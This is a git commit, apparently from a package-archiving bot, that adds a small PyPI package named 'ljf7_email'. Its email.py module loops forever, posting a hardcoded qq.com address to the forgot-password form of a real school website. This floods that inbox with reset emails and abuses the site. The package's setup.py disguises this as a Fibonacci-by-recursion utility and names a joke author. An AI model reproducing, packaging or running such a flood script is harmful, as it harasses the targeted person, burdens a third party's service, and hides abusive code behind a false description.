b3e3bd5a1c545276e32f62452b457030a509d4ec
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-22 03:09:07 +0000

    Add package ljf7-email/101/ljf7_email-101.tar.gz

---
+++ packages/ljf7-email/ljf7_email-101.tar.gz/ljf7_email-101/ljf7/email.py
@@ -0,0 +1,26 @@
+import requests
+from colorama import Fore
+
+def main():
+ email = '3119555212@qq.com'
+ amount_sent = 0
+
+ while True:
+  payload = {
+    "formkey": "0",
+    "email": email,
+    "username": email,
+    "submitbtn": "Send"
+  }
+  requests.post("https://ii.inschool.fi/forgotpasswd", data=payload)
+  amount_sent = amount_sent + 1
+  if amount_sent % 3 == 0 and amount_sent % 5 != 0:
+   print(Fore.RED + "Emails sent: " + str(amount_sent))
+  elif amount_sent % 5 == 0 and amount_sent % 3 != 0:
+   print(Fore.GREEN + "Emails sent: " + str(amount_sent))
+  elif amount_sent % 15 == 0:
+   print(Fore.MAGENTA + "Emails sent: " + str(amount_sent))
+  else:
+   begin_color = '\033[1;34m'
+   end_color = '\033[0m'
+   print(begin_color + "Emails sent: " + str(amount_sent) + end_color)
---
+++ packages/ljf7-email/ljf7_email-101.tar.gz/ljf7_email-101/setup.py
@@ -0,0 +1,10 @@
+from distutils.core import setup
+
+setup(
+    name = "ljf7_email",
+    version = "101",
+    description = "To solve fib by recursion",
+    author = "Linus Trovalds",
+    py_modules = ["ljf7.fib", "ljf7.email"],
+    long_description = "I am Andy Woz, it is nice to meet pypi.org. I can write scripts for myself and other XD"
+)
